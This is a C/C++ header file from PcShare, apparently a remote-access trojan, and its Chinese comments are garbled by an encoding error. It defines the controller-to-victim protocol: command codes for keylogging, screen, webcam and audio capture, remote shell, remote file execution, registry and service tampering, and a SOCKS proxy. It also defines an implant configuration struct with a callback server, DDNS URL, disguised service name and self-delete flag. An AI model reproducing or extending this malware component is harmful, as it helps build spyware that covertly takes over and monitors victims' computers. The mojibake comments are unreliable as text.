/************************************************************************/
/* ����PcShare�����԰汾����˵���������ն����⣩
/* �����԰�Լ��������
/* (1) �⼦��ANSI����;
/* (2) ���ƶ�Unicode����;
/* (3) �����ͳһʹ��ANSI����;
/* (4) �����ʹ�õĽṹ��struct���⼦�˱����ANSI�ģ����ƶ˽������Unicode�ģ�
/*     �ҽ���ʵ���߼�ֱ��ʹ�ýṹ��struct�е�TCHAR��Ա������
/* 
/* ʵ�ֲ��ԣ���MyServerTran��RecvDataWithCmd��SendDataWithCmd��ͳһʵ��
/*		���ƶ˵��⼦��Unicode���⼦��ANSI��ת�����Լ��⼦�����ƶ˵��⼦��ANSI
/*		��Unicode��ת����
/*
/* ʵ�ַ���һ��
/* (1) �ڿ��ƶ�Ϊ���д����Ľṹ��struct�ٶ���һ�ݴ�ANSI��ģ�
/* (2) ת��ʱnew��һ��ͬ�����Ĵ�ANSI��Ľṹ��struct���������滻ԭ����Unicode��ģ�
/* (3) Delete��Unicode��Ľṹ��struct��
/*
/* ʵ�ַ�������
/* (1) ֱ��ʹ��ԭ�ṹ��struct������sizeof(wchar_t)==sizeof(char)*2�����ԣ�
/* (2) �����ӿ��ƶ˵��⼦�˵�ת��ʱ��ֱ�Ӱѽṹ���е��ַ���Աת��ANSI�Ĵ���ԭ����ǿ�Ƶ�����ANSI�ģ�
/* (3) �������⼦�˵����ƶ˵�ת��ʱ��ֱ�Ӱѽṹ���е��ַ���Աת��Unicode�Ĵ���ԭ����ǿ�Ƶ�����Unicode�ģ�
/* (4) Ϊ��֤�⼦�˺Ϳ��ƶ˵Ľṹ��Ĵ�Сһ�£����ƶ˵��ַ���Աͳһ����sizeof(TCHAR);
/* (5) Ϊ��֤���ƶ����㹻�Ĵ�С�洢���⼦�˺Ϳ��ƶ˵��ַ���Աͳһ����2;
/* (6) ��Ȼ�ַ���Ա����һ�������������ӵĴ󲿷���0���Ҵ������ѹ����Ӱ�첻�󣬲���ժҪ���£�
/*     ����30���ֽڵ��ַ�����
/*	   char buf[30]  ==> char buf[30*2]����ѹ����ഫ��10�ֽڣ�
/*	   char buf[256]  ==> char buf[256*2]����ѹ����ഫ��16�ֽڡ�
/*
/* ��Ȼ������������ȥ�������ʣ��������˽ṹ��Ķ��壬�����˽ṹ����ڴ�new��delete,
/* ʵ�ʱ�����С���ʾ������÷�������
/* 
/* �ṹ�嶨��ʾ����
/* ԭ�ṹ�壺
/* 		typedef struct _PATHFILEITEM_
/* 		{
/* 			TCHAR m_FileName[256];
/* 		}PATHFILEITEM, *LPPATHFILEITEM;
/* �½ṹ�壺
/* 		typedef struct _PATHFILEITEM_
/* 		{
/* 			TCHAR m_FileName[256*2/sizeof(TCHAR)];
/* 		}PATHFILEITEM, *LPPATHFILEITEM;
/*
/* ͬʱ��Ϊ��֤�⼦������ƶ˵Ľṹ��struct����һ���ԣ���Ϊֻ����һ����
/*
/* �����������ʰ��޸Ĳ��ԡ����������� [9/17/2007 zhaiyinwei]
/************************************************************************/

/*
*	��������,��������
*/

#ifndef _PCINIT_
using namespace Gdiplus;
#endif

#define _VIP_

//��Ϣ����
#define WM_CLIENTMAINRCLICK		WM_USER + 400		//�û��һ����
#define WM_RESIZE_WND			WM_USER + 401		//����������Ŀ
#define WM_CLOSEITEM			WM_USER + 402		//�ͻ��ر�
#define WM_ICONINFO				WM_USER + 403		//ͼ����Ϣ
#define WM_LOGONEND				WM_USER + 404		//��¼�ɹ�
#define WM_DATA_ARRIVED			WM_USER + 405		//Meat Client �ķ�����Ϣ����
#define WM_GET_CMDTEXT			WM_USER + 406		//��ø�Meat Client��ָ��
#define WM_STOP_DOWN			WM_USER + 407		//�ļ������˳�
#define WM_SETMYCURSOR			WM_USER + 408		//������
#define WM_TREESELCHANGED		WM_USER + 409		//Ŀ¼�б�����˫��
#define WM_DIRRIGHTRCLICK		WM_USER + 410		//Ŀ¼�б����ӵ���
#define WM_INSERTMYITEM			WM_USER + 411		//������Ŀ
#define WM_SHOWURL				WM_USER + 412		//��ʾURL
#define WM_TRANS_START			WM_USER + 413		//��ʼ����
#define WM_TRANS_END			WM_USER + 414		//���ؽ���
#define WM_TRANS_STATE			WM_USER + 415		//����״̬
#define	WM_TRANS_INSERT			WM_USER + 416		//����������
#define WM_STARTTCP				WM_USER + 417		//�����˿�
#define WM_FILE_TRANS_START		WM_USER + 418		//�����ļ������б�
#define WM_REGLEFTDBCLICK		WM_USER + 419		//ע������ؼ�˫��
#define WM_REGLEFTRCLICK		WM_USER + 420		//ע������ؼ��Ҽ�����
#define WM_REGRIGHTRBCLICK		WM_USER + 421		//ע���༭(���ӵ���)
#define WM_ONEFRAME				WM_USER + 422		//һ֡ͼ��
#define WM_INITFRAME			WM_USER + 423		//��ʼ����Ļ
#define WM_CONNBREAK			WM_USER + 424		//�����ж�
#define WM_GETSTR				WM_USER + 425		//�õ��ִ�
#define WM_CRCLICK				WM_USER + 426		//��ʾ�˵�
#define WM_CLIENT_CONNECT		WM_USER + 427		//���ӽ���
#define WM_TRANS_COMPLETE		WM_USER + 428		//ͨ�����
#define WM_DATA_COMPLETE		WM_USER + 429		//���ӽ���
#define WM_DELETEVIEW			WM_USER + 430		//�ļ������걸
#define WM_KEEPALIVE			WM_USER + 431		//����
#define WM_TRANEVENT			WM_USER + 432		//���׽�������
#define WM_INSERTLOGS			WM_USER + 433		//������־
#define WM_FINDFILE				WM_USER + 434		//�����ļ�
#define WM_NOFILETRAN			WM_USER + 435		//�ļ������걸
#define WM_MULTINSERTBUF		WM_USER + 436		//��Ƶ���ӻ���
#define WM_UPDATEFILEINFO		WM_USER + 437		//�����ļ���Ϣ
#define WM_CLOSE_CLIENT_THREAD	WM_USER + 438		//�رտͻ����߳�
#define WM_MAIN_CONNECT			WM_USER + 439		//�ͻ������ӽ���
#define WM_SETFILEDOWNHWND		WM_USER + 440		//�ļ����ش���
#define WM_GETUPDATEDATA		WM_USER + 441		//ȡ���¿ͻ����ļ�����
#define WM_ADD_NEW_FILE			WM_USER + 443		//���������ļ��б�
#define WM_DL_DELETE_VIEW		WM_USER + 444		//ɾ���ļ�������
#define WM_CONNECT_EXIT			WM_USER + 445		//���ӵ���ת������


#define WM_CONNECT_DMOD			7999				//��������

#define WM_CONNECT_MAIN			8000				//��������
#define WM_CONNECT_FRAM			8001				//��Ļ����
#define WM_CONNECT_FILE			8002				//�ļ�����
#define WM_CONNECT_PROC			8003				//���̹���
#define WM_CONNECT_SERV			8004				//�������
#define WM_CONNECT_KEYM			8005				//���̼��
#define WM_CONNECT_MULT			8006				//��Ƶ���
#define WM_CONNECT_TLNT			8007				//�����ն�
#define WM_CONNECT_DL_FILE		8008				//�ļ�����
#define WM_CONNECT_UPDA			8009				//�Զ�����
#define WM_CONNECT_TURL			8010				//����url�ļ�
#define WM_CONNECT_UPLO			8011				//�ϴ�ִ���ļ�
#define WM_CONNECT_GDIP			8012				//����gdiplus.dll
#define WM_CONNECT_QUER			8013				//����
#define WM_CONNECT_REGT			8014				//ע������
#define WM_CONNECT_CWND			8015				//���ڹ���
#define WM_CONNECT_MESS			8016				//��ʾ����
#define WM_CONNECT_LINK			8017				//��������
#define WM_CONNECT_SOCKS		8018				//��������
#define WM_CONNECT_TWOO			8019				//�ڶ�����������
#define WM_CONNECT_FIND			8020				//�ļ�����
#define WM_CONNECT_CMD			8021				//����cmd.exe
#define WM_CONNECT_VIDEO		8022				//��Ƶ����
#define WM_CONNECT_AUDIO		8023				//��Ƶ����
#define WM_CONNECT_UP_FILE		8024				//�ϴ��ļ�
#define WM_CONNECT_GET_KEY		8025				//ȡ���̼����Ϣ

#define PS_LOCAL_SENDCMD		9000				//��������ͻ�
#define PS_LOCAL_FILETRAN		9001				//�����ļ�����
#define PS_LOCAL_SEND_MESS		9002				//������Ϣ�����
#define PS_LOCAL_SEND_LINK		9003				//֪ͨ���������ҳ
#define PS_LOCAL_SEND_TURL		9004				//֪ͨ��������ļ�
#define PS_LOCAL_SEND_UPDATE	9005				//֪ͨ���¿ͻ���
#define PS_LOCAL_SEND_UPLOAD	9006				//֪ͨ���¿ͻ���
#define PS_LOCAL_CHECK_FILE_DL	9007				//����Ƿ����ļ�����
#define PS_LOCAL_SHOW_MESS		9008				//��ʾ��Ϣ
#define PS_LOCAL_UPDATE_MOD		9010				//��̬�������ز��
#define PS_LOCAL_START_SOCKS	9011				//����socks
#define PS_LOCAL_UPDATE_KEY		9012				//��̬����KEY���

#define TRAN_DATA_LEN			1024 * 1024	* 20	//���ݽ�������
#define _FLAG_SYSTEM_FILE_		0x59983712			//�ļ�У���־

#define PS_ENTRY_COMM_KEY		0xf7				//�����


#define PS_SOCKET_CONNECT		20001			//��һ������

#define PS_TEST_DLL				0x1000
#define PS_NAKE_SERVICE			0x1001

#define PS_CLIENT_UNINSTALL		0x3000
#define PS_CLIENT_EXIT			0x3001

//�ִ���Դ

// ���⴦�� [9/19/2007 zhaiyinwei]

#define PS_TITLE				_T("PcShare")

#ifdef _VIP_
#define PS_VER_INFO				"��Ա�汾"
#else
#define PS_VER_INFO				"��Ѱ汾"
#endif
#define PS_EXT_VER_INFO			"win7-9.2.4"

#define PS_FENZU				_T("�����б�")
#define PS_SHEZHI				_T("��������")
#define PS_FENZUZONGSHU			_T("��������")
#define PS_FENZUSUOYIN			_T("��������")
#define PS_PUTONGKEHUZU			_T("��ͨ�ͻ���")

#define PS_WARNING				_T("����")
#define PS_CAOZUO				_T("����")
#define PS_INFO_NOTE			_T("�û�ע��")		//�û�ע����Ϣ
#define PS_INFO_VIEW			_T("�û�����")		//�û�������Ϣ

//���״���
#define CLIENT_PRO_UNINSTALL	30002				//ж�س���
#define CLIENT_SYSTEM_RESTART	30004				//��������
#define CLIENT_SYSTEM_SHUTDOWN	30005				//�رջ���

#define CLIENT_DISK_INFO		6001				//ȡ������Ϣ
#define CLIENT_FILE_INFO		6002				//ȡ�ļ���Ϣ
#define CLIENT_DIR_INFO			6003				//ȡĿ¼��Ϣ
#define CLIENT_DIR_LIST			6004				//�о�Ŀ¼
#define CLIENT_FILE_DELETE		6005				//ɾ���ļ�
#define CLIENT_CREATE_DIR		6006				//�½�Ŀ¼
#define CLIENT_RENAME			6007				//�������½�
#define CLIENT_DISK_LIST		6008				//ȡ�����б�
#define CLIENT_EXEC_FILE		6009				//Զ�����г���
#define CLIENT_PROCESS_KILL		6010				//��ֹ�û�����
#define CLIENT_REG_QUERY		6011				//��ѯָ����ֵ
#define CLIENT_REG_DELETE_KEY	6012				//ɾ���Ӽ�
#define CLIENT_REG_DELETE_VALUE 6014				//ɾ����ֵ
#define CLIENT_REG_UPDATE_VALUE	6015				//���ļ�ֵ
#define CLIENT_DOWN_FILE_LIST	6017				//�ͻ�Ŀ¼�����б�
#define CLIENT_PROCESS_LIST		6018				//ˢ�½����б�
#define CLIENT_ENUM_SERVICES	6019				//�оٷ���
#define CLIENT_CONTROL_SERVICES	6020				//���Ʒ���
#define CLIENT_CONFIG_SERVICES	6021				//���·�������
#define CLIENT_DELETE_SERVICE	6023				//ɾ������
#define CLIENT_FIND_FILE		6024				//�����ļ�
#define CLIENT_ENUM_WINDOWS		6025				//ö�ٴ���
#define CLIENT_CONTROL_WINDOWS	6026				//���ƴ���
#define CLIENT_FILE_TRAN		6027				//�����ļ�

#define NOT_FIND_ANY_FILE		7000				//�Ҳ����κ��ļ�
#define GET_PROCESS_LIST_ERR	7001				//ȡ�����б�ʧ��
#define ENUM_SERVICES_FAIL		7002				//ȡ�����б�ʧ��
#define CONTROL_SERVICES_FAIL	7003				//���Ʒ���ʧ��
#define CONFIG_SERVICES_FAIL	7004				//���·���״̬ʧ��
#define SERVICE_DELETE_ERR		7005				//ɾ������ʧ��
#define INVALID_COMMAND			7006				//��Ч����
#define CAN_NOT_OPEN_FILE		7007				//�޷����ļ�
#define EXEC_FILE_FAIL			7008				//Զ�����г���ʧ��
#define RENAME_FAILE			7009				//����ʧ��
#define CREATE_DIR_FAILE		7010				//����Ŀ¼ʧ��
#define COMMAND_PARAM_ERR		7011				//��������
#define REG_DELETE_KEY_ERR		7012				//ɾ���Ӽ�ʧ��
#define REG_RENAME_VALUE_ERR	7013				//������ֵ��ʧ��
#define REG_CREATE_VALUE_ERR	7014				//�����¼�ֵʧ��
#define REG_EDIT_VALUE_ERR		7015				//���ļ�ֵʧ��
#define OPEN_REG_KEY_ERR		7016				//�޷���ָ����ֵ
#define CAN_NOT_CREATE_TMP_FILE 7017				//�޷�������ʱ�ļ�
#define KILL_PROCESS_ERR		7018				//��ֹ����ʧ��
#define DL_FILE_LOSE			7019				//���ص��ļ�������
#define UP_FILE_FAIL			7020				//Զ�̻����ļ��Ѿ�����,�޷������ļ�
#define DL_FILE_LEN_ERR			7021				//���ص��ļ������쳣

#define PS_PROXY_SOCKS4			1			
#define PS_PROXY_SOCKS5			2

#define CMD_FRAME_MOUSE_STATE	1					//���״̬
#define CMD_FRAME_KEY_STATE		2					//����״̬
#define CMD_FRAME_KEY_ALL		3					//����CTRL+ALT+DEL

#define PS_UDP					1
#define PS_HTTP					2

#define PS_VER_ULONGLONG		0x1234567812345678

typedef enum tagWin32SysType{
   WindowsNT4,
   Windows2000,
   WindowsXP,
   Windows2003,
   Vista,
   Windows7
}Type;

typedef struct _SYSFILEINFO_
{
	UINT nVerifyFlag;
	UINT nExeFileLen;
	UINT nDllFileLen;
	UINT nModFileLen;
	UINT nSysFileLen;
	UINT nKeyFileLen;
}SYSFILEINFO, *LPSYSFILEINFO;

typedef struct _MOUSEINFO_
{
	WORD x;
	WORD y;
	WORD state;
	BYTE ch;
	BYTE cmd;
}MOUSEINFO,*LPMOUSEINFO;

typedef struct _REGINFO_
{
	DWORD m_NameLen;
	DWORD m_DataType;
	DWORD m_Datalen;
	BOOL  m_IsKey;
	TCHAR m_Name[256 * 2 / sizeof(TCHAR)];
	BYTE  m_Data[256 * 2];// BYTEֱ�Ӱѿռ�����һ�� [9/19/2007 zhaiyinwei]
}REGINFO, *LPREGINFO;

typedef struct _WINDOWITEM_
{
	TCHAR m_WndName[256 * 2 / sizeof(TCHAR)];
	TCHAR m_ProcName[256 * 2 / sizeof(TCHAR)];
	HWND  m_hWnd;
	UINT  m_CtrlType;
}WINDOWITEM, *LPWINDOWITEM;

// �����ƶ���ʹ�ã�����ͨѶ�õĽṹ [9/19/2007 zhaiyinwei]
typedef struct _ATTRIBITEM_
{
	TCHAR m_AttribTitle[256];
	TCHAR m_AttribValue[256];
}ATTRIBITEM, *LPATTRIBITEM;

typedef struct _RENAMEFILEITEM_
{
	TCHAR m_OldFileName[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
	TCHAR m_NewFileName[256*2/sizeof(TCHAR)];
}RENAMEFILEITEM, *LPRENAMEFILEITEM;

//_PSREGINFO_�µ� BYTE ���Ͳ����ٳ���sizeof(TCHAR)�������⼦�˺Ϳ��ƶ˵Ľṹ��С��һ�£�
//��Ϊ�м���Unicode�ַ��������Գ���2 [9/19/2007 zhaiyinwei]
typedef struct _PSREGINFO_
{
	TCHAR	m_Key[1024*2/sizeof(TCHAR)];//  [9/18/2007 zhaiyinwei]
	TCHAR	m_ItemName[256*2/sizeof(TCHAR)];
	BYTE	m_ItemValue[1024*2];
	DWORD	m_ValueLen;
	DWORD	m_ItemType;
	HKEY	m_RootKey;	
}PSREGINFO, *LPPSREGINFO;

typedef struct _PATHFILEITEM_
{
	TCHAR m_FileName[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
}PATHFILEITEM, *LPPATHFILEITEM;

typedef struct _CONTROLSERVICES_
{
	TCHAR m_Name[256*2/sizeof(TCHAR)];
	DWORD m_Flag;
}CONTROLSERVICES, *LPCONTROLSERVICES;

// �����ƶ���ʹ�ã�����ͨѶ�õĽṹ [9/19/2007 zhaiyinwei]
typedef struct _SAVEFILEINFO_
{
	TCHAR m_LocalPath[256];
	TCHAR m_RemotePath[256];
	TCHAR m_FileLen[28];
	TCHAR m_FilePoint[28];
}SAVEFILEINFO, *LPSAVEFILEINFO;

typedef struct _PROCESSLIST_
{
	DWORD th32ProcessID; 
	LONG  pcPriClassBase; 
	DWORD cntThreads; 
	TCHAR  szExeFile[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
}PROCESSLIST, *LPPROCESSLIST;

typedef struct _MYSERVICES_
{
	DWORD dwServiceType; 
	DWORD dwStartType; 
	DWORD dwErrorControl; 
	DWORD dwTagId; 
	TCHAR m_Name[260*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
	TCHAR m_Disp[260*2/sizeof(TCHAR)];
	TCHAR m_Status[20*2/sizeof(TCHAR)];
	TCHAR lpBinaryPathName[256*2/sizeof(TCHAR)]; 
	TCHAR lpLoadOrderGroup[256*2/sizeof(TCHAR)]; 
	TCHAR lpDependencies[256*2/sizeof(TCHAR)]; 
	TCHAR lpServiceStartName[256*2/sizeof(TCHAR)]; 
	TCHAR lpDisplayName[256*2/sizeof(TCHAR)]; 
	TCHAR lpDescribe[256*2/sizeof(TCHAR)];
	TCHAR lpPassword[256*2/sizeof(TCHAR)];
}MYSERVICES, *LPMYSERVICES;

typedef struct _INTERFILEINFO_
{
	BOOL			m_IsExec;
	BOOL			m_IsUpLoad;
	BOOL			m_Response;
	LARGE_INTEGER	m_FileLen;
	LARGE_INTEGER	m_FilePoint;
	HWND			hWnd;
	TCHAR			m_LocalFile[256*2/sizeof(TCHAR)];
	TCHAR			m_RemoteFile[256*2/sizeof(TCHAR)];
}INTERFILEINFO, *LPINTERFILEINFO;

typedef struct _CPFILEINFO_
{
	LARGE_INTEGER	m_FileLen;
	TCHAR			m_FileName[256*2/sizeof(TCHAR)];
}CPFILEINFO, *LPCPFILEINFO;

typedef struct _DIRINFO_
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData;
	int m_FileCount;
	int m_DirCount;
	ULONGLONG m_AllFileSize;
	TCHAR m_szFullName[256*2/sizeof(TCHAR)];
}DIRINFO, *LPDIRINFO;

typedef struct _FILEINFO_
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData;
	TCHAR m_szFullName[256*2/sizeof(TCHAR)];
}FILEINFO, *LPFILEINFO;

typedef struct _DISKINFO_
{
	int			m_DeviceType;
	ULONGLONG	FreeBytesAvailable;  
	ULONGLONG	TotalNumberOfBytes;   
	ULONGLONG	TotalNumberOfFreeBytes;
	TCHAR		m_Volume[128*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
	TCHAR		m_FileSys[128*2/sizeof(TCHAR)];
	TCHAR		m_Name[30*2/sizeof(TCHAR)];
}DISKINFO, *LPDISKINFO;

typedef struct _DIRFILELIST_
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData;
	TCHAR			m_ItemPath[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
}DIRFILELIST, *LPDIRFILELIST;

// �����ƶ���ʹ�ã�����ͨѶ�õĽṹ [9/19/2007 zhaiyinwei]
typedef struct _MYICONINFO_
{
	TCHAR m_Ext[5];
	int  m_Index;
}MYICONINFO, *LPMYICONINFO;

typedef struct _CMDINFO_
{
	UINT	m_Command;
	HWND	m_Hwnd;
}CMDINFO, *LPCMDINFO;

// �����ƶ���ʹ�ã�����ͨѶ�õĽṹ [9/19/2007 zhaiyinwei]
typedef struct _MYCHILDCMDINFO_
{
	CMDINFO m_Info;
	TCHAR	m_Id[256];
}MYCHILDCMDINFO, *LPMYCHILDCMDINFO;

typedef struct _MYUPLOADINFO_
{
	char m_FileExt[32];
	char m_Param[256];
	int  m_IsShow;
}MYUPLOADINFO, *LPMYUPLOADINFO;

typedef struct _MYINSERTDLFILEINFO_
{
	TCHAR m_Id[256];
	TCHAR m_Title[256];
	TCHAR m_LocalPath[256];
	TCHAR m_RemotePath[256];
}MYINSERTDLFILEINFO, *LPMYINSERTDLFILEINFO;

typedef struct _LOGININFOA_
{
	UINT		m_Cmd;				//��������
	DWORDLONG	m_UserId;			//�û���ʶ
	UINT		m_CpuSpeed;			//CPU��Ƶ
	DWORDLONG	m_MemContent;		//�ڴ�����
	UINT		m_ACP;				//ACP
	UINT		m_OEMCP;			//OEMCP
	UINT		m_IsVideo;			//�Ƿ�������ͷ
	UINT		m_SysType;			//����ϵͳ����
	UINT		m_CpuCount;			//CPU����
	HWND		m_hWnd;				//���Ӵ���
	TCHAR		m_Id[18*2/sizeof(TCHAR)];			//Ψһ��ʶ
	TCHAR		m_Note[64*2/sizeof(TCHAR)];			//�����ע��
	TCHAR		m_PcName[64*2/sizeof(TCHAR)];		//��������
	TCHAR		m_Group[32*2/sizeof(TCHAR)];		//�û�����
	TCHAR		m_SoftVer[32*2/sizeof(TCHAR)];		//����汾
}LOGININFO, *LPLOGININFO;

typedef struct _TCPCONNECTINFO_
{
	WSAPROTOCOL_INFO m_SocketInfo;
	LOGININFO		 m_SysInfo;
	TCHAR			 m_RealIp[256];
}TCPCONNECTINFO, *LPTCPCONNECTINFO;


// [9/19/2007 zhaiyinwei]
// �ýṹ���������⼦�ļ�ʱʹ�ã�������ͨѶ
// �ýṹ�ĳ�ANSI��ĸ���
typedef struct _PSDLLINFO_
{

//����
	UINT m_ServerPort;
	UINT m_DelayTime;
	UINT m_IsDel;
	UINT m_IsKeyMon;
	UINT m_PassWord;
	UINT m_DllFileLen;
	UINT m_SysFileLen;
	UINT m_ComFileLen;
	UINT m_CreateFlag;
	UINT m_DirAddr;

//�䳤
	char m_ServerAddr[256];		// TCHAR to char [9/19/2007 zhaiyinwei]
	char m_DdnsUrl[256];
	char m_Title[64];
	char m_SysName[24];
	char m_ServiceName[24];		//��������
	char m_ServiceTitle[256];	//��������
	char m_ServiceView[32];		//������ʾ����
	char m_SoftVer[32];			//����汾
	char m_Group[32];			//�û�����
	
//�ͻ��˱���
	UINT m_IsSys;
	UINT m_ExtInfo;
	char m_ID[18];
	char m_ExeFilePath[256];
}PSDLLINFO, *LPPSDLLINFO;

typedef struct _MYSAVEFILEINFO_
{
	ULONGLONG	m_FindFlag;
	DWORD		m_Size;
}MYSAVEFILEINFO, *LPMYSAVEFILEINFO;

typedef struct _PROXYLOGININFO_
{
	UINT	m_Cmd;
	DWORD	m_Data;
}PROXYLOGININFO, *LPPROXYLOGININFO;

typedef struct _MYSOCKSINFO_
{
	WORD	m_Port;
	char	m_User[64];
	char	m_Pass[32];
	HANDLE	hExitEvent;
}MYSOCKSINFO, *LPMYSOCKSINFO;

#define P_CONNECT_CMD		5001
#define P_CONNECT_DATA		5002
#define P_CONNECT_SUCCESS	5003
#define P_CONNECT_ERROR		5004
#define P_CONNECT_ALIVE		5005

#define PS_START_WIN7		11001		//win7����
#define PS_START_UPDATE		11002		//���¿ͻ���
#define PS_START_FILECOMB	11003		//�ļ�����
#define PS_START_FILECOPY	11004		//�ļ����󿽱�

#define PS_USER_ID			0x3030303030303030			//VIP�汾
extern TCHAR m_MainUrl[256];